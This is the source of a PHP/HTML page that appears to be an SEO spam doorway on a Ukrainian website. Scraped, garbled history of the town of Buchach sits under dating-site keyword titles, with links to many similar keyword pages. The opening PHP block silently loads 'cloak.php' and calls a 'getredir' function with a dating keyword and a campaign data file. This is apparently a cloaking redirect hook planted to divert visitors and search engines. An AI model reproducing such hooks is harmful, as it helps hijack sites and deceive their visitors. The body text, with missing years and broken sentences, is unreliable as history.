<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%81%d0%b0%d0%b9%d1%82%d0%b8+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2+%d0%be%d1%81%d1%82%d1%80%d1%96%d0%b2+%d0%91%d1%83%d1%87%d0%b0%d1%87+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Скарби Тернопільщини: інструкція до яскравих пригод</title>
	<meta name="description" content="Після відновлення незалежності України місто почало «Бучацькі оголошення», сайти «Бучач сьогодні»." />
	<link rel="canonical" href="https://masage.od.ua/img/248/myzyt-sayti-znayomstv.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/103/gote-zona-znayomstv-svrodonetsk.php">зона знайомств Сєвєродонецьк Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/137/huded-pravo-znayomstv.php">право знайомств в Бережани Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/398/mot-znayomstva-fotografv-poblizu.php">знайомства фотографів поблизу Макіївка Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Сайти знайомств острів Бучач Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Зокрема, окружна Руська Рада в місті скаржилася Головній Руській Раді, що: польські поміщики грабують, мучать народ руський, а австрійський уряд не перешкоджає йому, на скарги селян не звертає уваги, і, взагалі, селяни не можуть поскаржитись на пана, бо він за допомогою … властей покарає їх. Руська Рада в Бучачі повідомляла ГРР про переслідування українського селянства за підтримку вимоги поділу Галичини на 2 провінції. Скасування панщини р.</p>
<p>З  р.</p><strong><a id='y1'></a><h2>Місто на річці Стрипа: що варто подивитися і скуштувати в старовинному Бучачі (ВІДЕО)</h2></strong><p>Станом на  р. У -х роках у місті перебував білоруський та польський художник Наполеон Орда , який виконав малюнки міста. У х роках під прикриттям протидії полонізації у місті посилились позиції москвофілів. Перед Першою світовою лідерами бучацьких москвофілів були лікар доктор В. Могильницький [] , гімназійний учитель Онуфрій Ґеців платний агент. Утворене в місті відділення «Товариства ім. Качковського» утримувало бурсу для гімназистів сприяли деякі священники — Ульванський, Копистянський , найбільше гімназистів-москвофілів [] було з Джурина.</p>
<p>Почесним членом повітової філії «Просвіти» був Володимир Гнатюк  — уродженець Бучаччини [].</p><strong><a id='y2'></a><h2>Бучацький район</h2></strong><p>Бучач увійшов до го сільського змішаного округу IV курія; Бучач, Підгайці, Монастирська, Вишнівчик ; депутат — львівський адвокат доктор Генрик Ґабль , заступник — доктор Лонгин Цегельський []. На початку XX  ст. Перед I-ю світовою Бучач був одним з небагатьох повітових центрів Галичини, у якому мешкали міщани-українці; також — не було приміщення «Народного Дому» , тому мандрівний театр «Руської бесіди» вистави давав, наприклад, у заїзді Шнітліха. Під час Першої світової війни в межиріччі Серету і Стрипи проходила лінія фронту.</p><strong><a id='y3'></a><h2>Бучач — Візіком карти</h2></strong><p>На початку І-ї світової російські війська спричинили пожежу, вся середина міста і передмістя поза церкву Св. Покрови вигоріла дотла згарища залишались до початку ІІ-ї світової. З проголошенням ЗУНР частини склали зброю. Шефом експозитури для відбудови поселень був майор Віктор Лучків. Станиця жандармерії була трохи більша, ніж у мирний час, серед них — українці зокрема, заступник команданта Павло Кухтин з Переволоки.</p>
<p>Останнім повітовим старостою був Людвік Бернацький [] [b] , його заступником — барон Лєвартовський, посадником міста — Прусак.</p><img src="https://uatv.ua/wp-content/uploads/2020/01/Zapysaty-1-8.jpg" alt="Навігаційне меню" style="max-width: 480px; max-height: 480px;"/><p>Нагірянського, Кирила Крижанівського помер на тиф у таборі. Читальня «Просвіти» під час I-ї світової війни не діяла. Перехід влади до українців у місті відбувся швидко як і в Станіславі, Стрию, Коломиї, Бродах, Збаражі [] , спокійно. Першим міським головою посадником міста тоді був Рогозинський Климентій , першим державним повітовим комісаром обраний на повітовій нараді більшістю голосів  — доктор Боцюрків Іларіон. Після виборів повітового комісара на зборах 7 листопада  р. Помітний вплив на життя міста того часу мала родина його пароха о.</p>
<p>Дениса Нестайка. Травень  — червень  р. Переглядали «фатальну ситуацію на фронті», вирішили використати всі можливості для оборони Галичини, у крайньому випадку — перевести УГА за Збруч []. Важливу роль при звільненні міста відіграла артилерія УГА. В ті дні добровольцями стали УГА близько 5 мешканців міста та повіту. Місто було одним з орієнтирів планованого напрямку наступу армійських груп польських генералів Ю. Після закінчення першої світової війни почала діяти Версальсько-вашингтонська система. У липні року місто окупували польські війська.</p>
<p>Наприкінці липня — на початку серпня  р. У серпні  р. Омелянович-Павленко віддав наказ покинути місто. До 17 серпня бойових дій не було. Бучацький ревком голова М. Галон виконував декрети більшовицького Галицького революційного комітету Галревкому , що містився в Тернополі. Від більшовиків місто 16 вересня звільнили частини Дієвої Армії УНР Бучацький повіт визволяла середня група під командою генерала Олександра Загродського в складі 1-ї Запорізької, 2-ї Волинської, 6-ї січової дивізій група.</p>
<p>Тодішній польський уряд не думав надавати Галичині автономію, посилив заходи, щоб припинити український розвиток, проводячи політику полонізації.</p>
		
			<br><ol>
			
				<li>сватання виконавчої влади Голубівка Україна.</li>
			
				<li>Слідкуйте за новими пропозиціями для відпочинку!</li>
			
				<li>.</li>
			
			</ol>
		
	<p>Качковського» утворюють «Українське міщанське братство» УМБ , яке діяло на основі статуту «Просвіти»  р. Дениса Нестайка , після нього був о. Педагог, музикант Софія Ілевич відкрила в місті музичну школу на початку х років. За цей час було зведено будинок «Каси хворих», до якого після І-ї світової перенесли «скарбовий уряд». Вересень  р. Галичину зайняли червоноармійські війська, 18 вересня  р. Прихід нової влади по-різному зустріли представниками як етнічних громад Бучача української, єврейської, польської , так і різних соціальних прошарків — інформовані жителі знали про Голодомор , репресії —  На жаль, для нової влади чільні представники української громади міста становили «буржуазно-націоналістичну» загрозу, були «занадто інтелігентними та свідомими», тому їх переслідування не забарилось зокрема, у квітні року з двірця залізничної станції Бучача до Казахстану виїхало 28 товарняків з особами [] , а закінчилось воно жахливою різнею перед відступом більшовиків з Бучача.</p>
<p>Тільки року рештки [] бучачан, знайдених у підвалі церкви Св. Покрови, були поховані в спільній могилі біля цього храму. Спротив новому режиму чинили українці зокрема, члени ОУН , поляки створили підпільну організацію для боротьби з більшовиками []. За нової влади почала виходити районна газета «За нове життя», на базі майстерні створили ливарно-механічний завод, відкрили зооветеринарний технікум перевели з Язловця.</p><a id='y4'></a><h3>Партнери відпочинку</h3><p>Під час відступу більшовики знищили та спалили міський архів. Аерофотосвілину повоєнного міста дивіться в Ізраїльській вікі. Бучач зайняли війська вермахту. Проведений нашвидкуруч перепис встановив: проживали понад євреїв, трохи більше українців, поляків. Kreishauptmannschaft Tschortkau. Крайсгауптмани: Ґерхард Літтшваґер , Ганс Куят.</p>
		
	<p>З 1 березня ляндкомісаром [] Бучача був нім. Verwaltungsobersekretär Вальтер Гофер. Landkommissariate Buczacz. Гітлерівці знищили близько жителів міста і району, переважно євреїв. Молодих людей примусово вивозили на роботу до Німеччини. Під час Другої світової війни колію залізниці у напрямку до Станіславова було зруйновано, пізніше — розібрано, не відновлено по цей час місцями залишилися насипи — «штрики».</p>
<p>Перше повідомлення влади для єврейської громади було у серпні  р. Частина молодих робітників була переведена до концтабору у Великих Бірках ніхто не повернувся. Нацистська поліція порядку та, під примусом, українська поліція нападали на єврейські домівки і насильно конвоювали мешканців на міську площу; деякі євреї ховались в підвалах та бункерах, тож почалися ретельні обшуки.</p>
<p>Більшість бункерів були добре замасковані, гітлерівці розбирали будинки та руйнували фундаменти, сподіваючись знайти захованих. Багато спромоглися втекти з площі, де їх зібрали перед відправленням, близько вбили при спробі втечі. Того дня заарештували осіб, яких потім відправили на залізничну станцію для транспортування в запечатаних товарних вагонах у табір смерті в Берґен-Бельзен. У червні  р. Одним зі «звичаїв» в роботі місцевого НКВД було залишати тіла вбитих біля стіни власної будівлі на кілька діб. Родичі загиблих боялись чи остерігались підійти, бо могли отримати по 25 років тюрми чи таборів.</p>
		
			
				<div>Знайомства в інтернеті: як це роблять німці - DW Ukrainian</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/tKPqgSJvroU' frameborder='0' allowfullscreen></iframe></div>
			
		
	
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/467/pij-shvidk-znayomstva-storozhinets.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/196/rux-znayomstva-onlayn.php">знайомства онлайн Ялта Україна</a></li><li><a href="https://masage.od.ua/img/418/jiret-dvchata-sho-znayomstva.php">дівчата, що знайомства поблизу Козятин Україна</a></li><li><a href="https://masage.od.ua/img/352/tuku-znayomstva-z-cholovkom.php">знайомства з чоловіком Яготин Україна</a></li><li><a href="https://masage.od.ua/img/240/lak-tovstushki-znayomstva-v.php">товстушки знайомства в Кривий Ріг Україна</a></li><li><a href="https://masage.od.ua/img/352/pol-posluga-znayomstv.php">послуга знайомств мільйонерів в Часів Яр Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#y1'>Місто на річці Стрипа: що варто подивитися і скуштувати в старовинному Бучачі (ВІДЕО)</a></li>
<li><a href='#y2'>Бучацький район</a></li>
<li><a href='#y3'>Бучач — Візіком карти</a></li>
<li><a href='#y4'>Партнери відпочинку</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/361/lola-znayomstva-bl.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>